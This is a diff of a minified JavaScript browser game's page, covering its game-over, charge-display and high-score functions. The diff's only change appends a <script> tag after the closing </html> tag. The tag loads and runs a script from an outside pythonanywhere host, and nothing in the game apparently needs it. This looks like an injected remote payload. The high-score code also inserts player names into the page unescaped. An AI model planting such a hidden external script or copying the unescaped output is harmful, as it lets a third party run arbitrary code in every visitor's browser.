@@ -34,4 +34,4 @@ function gameOver(){clearInterval(enespawn);gameActive=!1;chargeStrong=0;chargeW
     z++}
     score=0}
 function updateChargeDisp(){howmuchchargestrong.innerText=Math.floor(chargeStrong)+'%';howmuchchargestrong.style.width=Math.floor(chargeStrong)+'%';howmuchchargeweak.innerText=Math.floor(chargeWeak)+'%';howmuchchargeweak.style.width=Math.floor(chargeWeak)+'%'}
-function drawHighScores(){highScoreDisp.innerHTML='';for(var $c=0;$c<10;$c++){if(scores[$c].score!=0){highScoreDisp.innerHTML+=scores[$c].name+': '+scores[$c].score+'<br/>'}}}</script></body></html>
+function drawHighScores(){highScoreDisp.innerHTML='';for(var $c=0;$c<10;$c++){if(scores[$c].score!=0){highScoreDisp.innerHTML+=scores[$c].name+': '+scores[$c].score+'<br/>'}}}</script></body></html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
